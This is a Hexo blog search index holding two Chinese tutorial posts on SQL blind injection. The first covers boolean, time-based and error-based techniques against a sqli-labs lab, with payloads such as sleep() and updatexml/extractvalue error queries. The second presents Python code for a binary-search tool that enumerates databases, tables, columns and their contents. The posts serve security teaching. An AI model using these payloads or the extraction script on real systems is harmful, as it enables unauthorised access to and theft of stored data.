<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[高级注入（一）]]></title>
    <url>%2F2020%2F03%2F08%2F%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[课程简介​ 主要讲解SQL盲注基本概念，SQL盲注的挖掘方式和详细的利用过程（猜解库、表、字段名和字段内容），使用二分法基于SQL盲注漏洞的python脚本开发详解。 ​ 主要讲解常用SQL注入自动化工具的使用，非常规SQL注入漏洞的挖掘与利用，常见Waf限制下的SQL注入绕过姿势和技巧，SQL注入漏洞的防御手段详解。 一、 SQL盲注1.1 SQL盲注的概述​ 对于正常的SQL注入漏洞来说，我们一般是可以直接通过页面回显的信息情况进行判断，当前位置是否存在注入，从而进一步去猜解当前数据库的库名、表名、字段名以及字段内容。但对于SQL盲注来说，是不能通过直接显示的途径来获取数据库的数据的。在盲注中，攻击者只能根据其页面返回的不同来判断，可能是页面内容的不同（报错），也可能是页面的响应时间不同（时间）等。 1.2 SQL盲注的分类 布尔盲注 时间盲注 报错盲注 二、SQL盲注的挖掘2.1 布尔盲注2.1.1 概述​ 页面只返回True和False两种页面类型，利用页面返回不同，逐一猜解数据内容的方式，我们称为布尔盲注。 2.1.2 注入点判断方法：单引号带入法 这边使用一个sqlilab的一个环境，正常情况下请求目标服务器的url:http://192.168.55.103/Less-8/?id=1，页面是可以正常显示。 在id位置处带入单引号url:http://192.168.55.103/Less-8/?id=1&#39;,发现页面没有数据的正常回显。 注：通过页面的回显结果，正常输入页面返回正常为True，带入单引号造成原始数据库查询语句报错，返回的页面结果为空，但是并有错误信息输出，为False。通过上述测试方法判断。 源代码分析 1234567891011121314151617181920212223242526272829303132333435&lt;?php//including the Mysql connect parameters.include("../sql-connections/sql-connect.php");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id."\n"); fclose($fp); // connectivity $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size="5" color="#FFFF00"&gt;'; echo 'You are in...........'; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123;echo '&lt;font size="5" color="#FFFF00"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo "You have an error in your SQL syntax"; echo "&lt;/br&gt;&lt;/font&gt;"; echo '&lt;font color= "#0000ff" font size= 3&gt;'; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125;?&gt; 上述代码为当前环境查询数据调用数据库的php源代码，我们主要来分析源代码中主要的部分。 $id=$_GET[&#39;id&#39;]； 接收用户输入id的值 当用户正常输入1时，此时$id=1 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;此为数据库的查询语句 用户输入数据后，原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1&quot;; 带入到数据库查询后，就将id=1的数据内容返回给浏览器 当我们带入非法字符单引号的时候，此时$id=1&#39; 原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; 我们发现原本查询语句中有单引号，当我们带入单引号时，会导致原本的单引号无法闭合而造成查询语句报错，无法正常查询数据内容 2.2 时间盲注2.2.1 概述​ 正常情况下，当对数据库进行查询操作时，如果查询条件不存在，语句执行的时间是0ms；如果查询条件满足，语句执行速度也会非常快，接近0ms；这时候，可以使用sleep()或BENCHMARK()函数,在满足条件时，对查询的时间进行延长，通过浏览器的响应时间判断是否存在时间盲注。 2.2.3 时间布尔的区别​ 前面讲过布尔盲注，这里有小伙伴可能会质疑二者有什么区别，可以想象一个场景，无论输入任何字符（不管是正确的语句，还是恶意的注入语句），web页面都会正常显示（页面被管理员采用了”重定向”或”屏蔽”等措施），这样就无法通过布尔盲注进行判断是否存在注入了，只能通过时间延迟判断。 2.2.3 注入点判断判断函数 sleep(n) 格式：sleep(n)，n为设置的时间，单位是s(秒)； 定义：时间延迟函数，借助此函数可以在processlist中捕获到执行迅速不易被查看到的语句，以确定程序是否确实在server端发起该语句。 使用细节： 正常查询数据的时间为0s 带入sleep函数查询数据的时间 从图中我们可以清楚的看到，带入sleep函数的查询语句，查询数据的时间明显增长 benchmark()函数 格式：benchmark(count,expr)，执行表达式expr的count(重复次数) 定义：用来测试mysql进程有多快，设定好执行expr(表达式)的次数(count)，可以看到时间的变化； 使用细节： 页面延时法 首先，我们正常请求目标页面url:http://192.168.55.106/Less-9/?id=1，页面正常返回数据结果 带入单引号进行测试尝试，此时url为url:http://192.168.55.106/Less-9/?id=1&#39;，请求之后我们发现页面显示结果和原来一样，没有任何变化。这就回到我们所讲到的时间盲注和布尔盲注的一个区别，我们可能无法从页面响应结果进行直接判断。 带入sleep函数镜进行测试判断，此时url为url:http://192.168.55.106/Less-9/?id=1&#39; and sleep(5)--+，我们发现页面结果的回显时间明显增长。 综上测试过程，我们可以通过页面响应的时间判断，当前页面是否存在注入。当我们带入sleep函数时，我们可以判断出因为sleep能延长数据的查询时间，我们在请求页面时，我们构造的sleep函数被带入到了原有的查询语句中去执行，导致了页面响应时间变长，由此我们可以判断出当前页面存在时间盲注。 源代码分析 123456789101112131415161718192021222324252627282930if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; $id=$_GET[&#39;id&#39;]获取用户输入的id值 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;数据库执行语句 在前面我们带入延时函数的格式为1&#39; and sleep(5)--+ 从原语句我们可以看出我们带入构造语句后，原查询语句变成: SELECT * FROM users WHERE id=&#39;1&#39; and sleep(5)--+&#39;LIMIT 0,1 这里的单引号用来闭合前一个单引号 –+为sql代码中的注释符，它可以将后面的代码完全注释掉，就形成了一个新的查询语句执行，这样sleep函数就被成功写入，导致查询数据结果的时间变长。 2.3 报错盲注2.3.1 原理​ 基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而使我们得到想要的基本信息——数据库名、版本、用户名等。 ​ 因为mysql有一个bug，这个bug在使用count() group by 对一些rand()函数进行操作时会返回错误信息rand()产生的数列是关键，而且想获取的数据库信息会显示在报错信息中。 2.3.2 涉及函数count() 作用:统计元组（每条数据）的个数。 rand() 作用：随机取0-1的数字 通常和floor()函数（向下取整）连用，将rand()乘以 2 是为了能得到 1 和 0 两个随机数； concat()函数 作用：聚合函数，将多个列数据合并到一个字符串中 exp()函数 作用: 返回以e的x次方的值； 格式：exp(x) 漏洞利用：使double类型的数值超出范围从而查看报错的信息，需要mysql版本在5.5.x及以上,但是在mysql&gt;5.5.53时，则不能返回查询结果 利用语句： 1select exp(~(select * from(select version())as a )); updatexml()函数 作用: 对xml文档进行查询和修改； 格式：updatexml(xml_document,XPath_string,new_value); xml_document: String格式,为xml文档对象的名称; XPath_string: Xpath格式的字符串,可以了解下xpath语法; new_value: String格式,替换查找到的符合条件的数 报错利用：mysql版本需要5.1.x及以上 利用命令： 1select 1,updatexml(1,concat(char(38),(select @@version),char(38)),1); extractvalue()函数 作用：对xml文档进行查询和修改； 格式：extractvalue(xml_frag,xpath_expr) xml_frag: xml标记 xpath_expr: xpath表达式 报错利用：利用extractvalue函数的报错信息获取信息，mysql版本需要5.1.x及以上 利用命令： 1select 1,extractvalue(1,concat(char(38),(select @@version),char(38))); group by 作用：聚合函数，根据一个或多个列对结果集进行分组并有排序功能 报错注入公式 select count(*),concat(0x22,database(),0x22,floor(rand(0)*2))x from information_schema.tables group by x; 0x22: 表示双引号 x:相当于把concat获取的数据列更名为x，也是为了方便group by的操作 注：疑问解答，这里的rand内为什么要加0？ rand内加随机因子0是保证报错百分之百触发 不加随机因子0，可能不触发报错 关键表被禁用，可用如下格式 1select count(*) from (select 1 union select null union select !1) as a group by concat(version(),floor(rand(0)*2)); 注：这边一定要对select 1 union select null union select !1这个语句使用别名，否则会报错 rand()函数被禁用 1select min(@a:=1) from information_schema.tables group by concat(database(),@a:=(@a+1)%2); 利用myslq的重复性导致报错来获取信息 1select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 2.3.3 注入点的判断源代码分析 123456789101112131415161718192021222324252627if(($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 查看源码，与原来的没差。但是我们发现，在判断语句当中，当sql语句正确的情况下，直接输出You are in的字符串。 但是当我们构造报错语句，导致sql报错，这边的print_r(mysql_error());语句就会输出错误语句到浏览器端供用户查看。这边我们就可以更好利用报错注入进行相关数据库的注入攻击。 单引号带入 正常请求：url:http://192.168.55.104/Less-5/?id=1 单引号带入: url:http://192.168.55.104/Less-5/?id=1&#39; 综上测试，发现数据库报错，判断存在注入。并且这边只是输出了错误信息。只能用报错盲注。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于sql布尔盲注的python脚本开发]]></title>
    <url>%2F2020%2F03%2F07%2F%E5%9F%BA%E4%BA%8Esql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84python%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91.html</url>
    <content type="text"><![CDATA[4.1 python概述4.1.1 模块详解optparse 作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;database&quot;,help=&quot;Please input test databases&quot;) #需要的命令行参数 (options,args)=parser.parse_args() #解析脚本输入的参数值，options是一个包含了option值的对象;args是一个位置参数的列表 add_option()方法中的参数说明 action: 用于控制对选项和参数的处理,像无参数选项处理。（缺省为stroe。 stroe_true, stroe_false） type: 选项的值类型,值的默认类型是字符串, 这里将值指定为其他类型. help:选项中有 -h 时打印的 help 信息. dest:可以决定解析后,取值时的属性名, 尤其适于有多个等价参数. 不指定时就是选项不加-的字符串. requests 作用：模拟人操作浏览器对网页的请求操作。 用法： import requests #导入requests模块 requests.get(‘https://github.com/timeline.json’) # GET请求 requests.post(“http://httpbin.org/post”) # POST请求 requests.put(“http://httpbin.org/put”) # PUT请求 requests.delete(“http://httpbin.org/delete”) # DELETE请求 requests.head(“http://httpbin.org/get”) # HEAD请求 requests.options(“http://httpbin.org/get” ) # OPTIONS请求 响应的内容 r.encoding #获取当前的编码 r.encoding = &#39;utf-8&#39; #设置编码 r.text #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。 r.content #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。 r.headers #以字典对象存储服务器响应头，字典键不区分大小写，若键不存在则返回None r.status_code #响应状态码 r.raw #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read() r.ok # 查看r.ok的布尔值便可以知道是否登陆成功 r.json() #Requests中内置的JSON解码器，以json形式返回 r.raise_for_status() #失败请求(非200响应)抛出异常 time 作用：可以用于格式化日期和时间，时间间隔是以秒为单位的浮点小数。 用法： import time #导入time模块 time.sleep(secs) #推迟调用线程的运行，secs指秒数。 time.time() #获取当前的系统的时间戳 sys 作用：sys模块提供对由解释器使用或维护的某些变量、与解释器交互的函数的访问接口。 用法： sys.argv #传递给python脚本的命令行参数列表。argv[0]表示脚本名称(是不是完成路径名取决于操作系统)。如果命令使用-c选项执行，argv[0]表示字符串-c。如果命令行没有指定脚本名称，argv[0]为空字符串。 sys.exit(n) #程序退出，如果是正常退出是sys.exit(0) sys.path #返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值 sys.stdout.write sys.stdout.flush #刷新缓冲区 4.1.2 面向对象面向对象编程——Object Oriented Programming，简称 OOP，是一种程序设计思想。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。 方法：类中定义的函数。 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。 数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 局部变量：定义在方法中的变量，只作用于当前实例的类。 实例变量：在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。 实例化：创建一个类的实例，类的具体对象。 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。 三大特点：数据封装、继承、多态。 4.2 脚本开发4.2.1 功能逻辑设计思路 基于布尔型盲注脚本开发 主程序入口(boolbaseblind.py) optparse模块实现脚本参数化输入 对功能模块的调用 二分查找与网页请求(class Merge_serach) get_url_request 实现网页请求功能 merge_serach 实现二分查找遍历数值 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 get_all_db_Length 实现获取所有库名的长度功能 def get_all_db_Name 实现获取所库名称功能 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 get_all_table_Length 实现获取指定库所有表名的长度功能 get_all_table_Name 实现获取指定库所有表名称功能 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 get_all_column_Length 实现获取指定表中所有字段长度 get_all_column_Name 实现获取指定表中所有字段名 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数量 get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 get_all_cl_content_details 实现获取指定字段中所有字段内容 4.2.2 编码实现 主程序入口(boolbaseblind.py) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/local/env python3# -*- coding: UTF-8 -*-# Author: Mr.zhang# Tel:15888371774# Date:2020-2-28from guessdatabase import GuessDatabasefrom guesstables import GuessTablesfrom guesscolumns import GuessColumnsfrom guessclcontent import GuessClContentimport optparseimport timeimport sysparser=optparse.OptionParser()parser.add_option("-D", "--database", action="store",type="string",dest="database",help="Please input test databases")parser.add_option("-T", "--table",action="store",type="string",dest="table",help="Please input test table")parser.add_option("-C", "--column",action="store",type="string",dest="column",help="Please input test column")parser.add_option("-U","--url", action="store",type="string",dest="url",help="Please input test url")(options,args) = parser.parse_args()def main(): if options.url == None and options.database == None and options.table == None and options.column == None: print("Please read the help") parser.print_help() sys.exit() elif options.url != None and options.database ==None and options.table == None and options.column == None: start_time = time.time() guessdb = GuessDatabase(options.url) #创建获取guessdb对象 db_count = guessdb.get_all_db_Count() db_length_list = guessdb.get_all_db_Length(db_count) guessdb.get_all_db_Name(db_count, db_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有库名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table == None and options.column == None: start_time = time.time() guesstb = GuessTables(options.url,options.database) #创建获取guesstb对象 tb_count = guesstb.get_all_table_Count() tb_length_list = guesstb.get_all_table_Length(tb_count) guesstb.get_all_table_Name(tb_count, tb_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有表名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column == None: start_time = time.time() guesscl = GuessColumns(options.url,options.database,options.table) cl_count = guesscl.get_all_column_Count() cl_length_list = guesscl.get_all_column_Length(cl_count) guesscl.get_all_column_Name(cl_count, cl_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有字段名所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) elif options.url != None and options.database !=None and options.table != None and options.column != None: start_time = time.time() guessclcontent = GuessClContent(options.url,options.database,options.table,options.column) cl_content_count = guessclcontent.get_all_cl_content_Count() cl_content_length_list = guessclcontent.get_all_cl_content_Length(cl_content_count) guessclcontent.get_all_cl_content_details(cl_content_count, cl_content_length_list) end_time = time.time() print('[+] INFO : \033[1;35;0m猜解所有字段内容所用时间为 %d 秒 \033[0m' %int(end_time-start_time)) if __name__ == "__main__": main() 二分查找与网页请求(class Merge_serach) get_url_requests 实现网页请求功能 123456def get_url_request(self, final_payload): try: result = requests.get(url = final_payload, headers = self.headers, timeout = 3).text except TimeoutError as e: print("请求超时。。。") return result merge_serach 实现二分查找遍历数值 123456789101112131415161718def merge_serach(self, url, payload): # 定义循环数据列表 range_list = [x for x in range(0,127)] min = 0 #代表列表下标的起始值 max = len(range_list) - 1 #代表列表下标的结束值 while True: mid = (max + min) // 2 #获取列表下标的中间值 #定义最终payload格式 final_payload = url + payload + ' &gt; &#123;&#125;--+'.format(mid) result = self.get_url_request(final_payload) if "You are in" in result: min = mid else: max = mid if min == max - 1: if "You are in" in result: return max return min+1 猜解数据库库名(class GuessDatabase) get_all_db_Count 实现获取数据库库名数量 1234def get_all_db_Count(self): db_count = self.merge_serach.merge_serach(self.url, self.db_count_payload) print('[+] INFO : 当前 mysql 中库的数量为: %d' %(db_count)) return db_count get_all_db_Length 实现获取所有库名的长度功能 12345678def get_all_db_Length(self, db_count): db_length_list = [] #循环获取所有表名的长度 for i in range(0,db_count): db_length = self.merge_serach.merge_serach(self.url, self.db_length_payload.format(i)) db_length_list.append(db_length) # print("[+] INFO : 库 %d 的长度是: %d" % (i+1, db_length)) return db_length_list def get_all_db_Name 实现获取所库名称功能 12345678910def get_all_db_Name(self, db_count, db_length_list): for i in range(0, db_count): print('[+] INFO : 库 %d 的名称为: ' %(i+1), end = '') db_name = "" for j in range(1, db_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.db_name_payload.format(i, j))) db_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库表名(class GuessTables) get_all_table_Count 实现获取指定库所有表名数量 1234def get_all_table_Count(self): tb_count = self.merge_serach.merge_serach(self.url, self.tb_count_payload.format(self.db_name)) print('[+] INFO : 当前 %s 库中表的数量为: %d' %(self.db_name, tb_count)) return tb_count get_all_table_Length 实现获取指定库所有表名的长度功能 1234567def get_all_table_Length(self, tb_count): tb_length_list = [] for i in range(0, tb_count): tb_length = self.merge_serach.merge_serach(self.url, self.tb_length_payload.format(self.db_name, i)) tb_length_list.append(tb_length) # print(tb_length_list) return tb_length_list get_all_table_Name 实现获取指定库所有表名称功能 12345678910def get_all_table_Name(self, tb_count, tb_length_list): for i in range(0, tb_count): print('[+] INFO : 当前 %s 库中第 %d 个表的名称为:' %(self.db_name, i + 1), end = '') tb_name = "" for j in range(1, tb_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.tb_name_payload.format(self.db_name, i, j))) tb_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段名(class GuessColumns) get_all_column_Count 实现获取指定表中所有字段数量 1234def get_all_column_Count(self): cl_count = self.merge_serach.merge_serach(self.url, self.cl_count_payload.format(self.db_name, self.tb_name)) print('[+] INFO : 当前 %s 表中字段的数量为: %d' %(self.tb_name, cl_count)) return cl_count get_all_column_Length 实现获取指定表中所有字段长度 1234567def get_all_column_Length(self, cl_count): cl_length_list = [] for i in range(0, cl_count): cl_length = self.merge_serach.merge_serach(self.url, self.cl_length_payload.format(self.db_name, self.tb_name, i)) cl_length_list.append(cl_length) # print(cl_length_list) return cl_length_list get_all_column_Name 实现获取指定表中所有字段名 12345678910def get_all_column_Name(self, cl_count, cl_length_list): for i in range(0, cl_count): print('[+] INFO : 当前 %s 表中第 %d 个字段的名称为:' %(self.db_name, i + 1), end = '') cl_name = "" for j in range(1, cl_length_list[i] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_name_payload.format(self.db_name, self.tb_name, i, j))) cl_name += curr_str sys.stdout.write(curr_str) sys.stdout.flush() print('') 猜解数据库字段内容(class GuessClContent) get_all_cl_content_Count 实现获取指定字段中所有字段内容的数 12345def get_all_cl_content_Count(self): for i in range(0, len(self.cl_name_list)): cl_content_count = self.merge_serach.merge_serach(self.url, self.cl_content_count_payload.format(self.cl_name_list[i], self.db_tb_name)) print('[+] INFO : 当前 %s 字段中内容的数量为: %d' %(self.cl_name, cl_content_count)) return cl_content_count get_all_cl_content_Length 实现获取指定字段中所有字段内容的长度 1234567891011def get_all_cl_content_Length(self, cl_content_count): all_list = [] for j in range(0, len(self.cl_name_list)): cl_content_length_list = [] for i in range(0, cl_content_count): cl_content_length = self.merge_serach.merge_serach(self.url, self.cl_content_length_payload.format(self.cl_name_list[j], self.db_tb_name, i)) cl_content_length_list.append(cl_content_length) # print(cl_content_length_list) all_list.append(cl_content_length_list) # print(all_list) # print(self.db_tb get_all_cl_content_details 实现获取指定字段中所有字段内容 12345678910def get_all_cl_content_details(self, cl_content_count, all_list): for i in range(0, len(all_list)): print('[+] INFO : 字段 %s 的内容为: ' % self.cl_name_list[i],end = '') for j in range(0, len(all_list[i])): cl_content_details = "" for z in range(1, all_list[i][j] + 1): curr_str = chr(self.merge_serach.merge_serach(self.url, self.cl_content_details_payload.format(self.cl_name_list[i], self.db_tb_name, j, z))) cl_content_details += curr_str print(' | %s | ' %cl_content_details, end = '') print('')]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
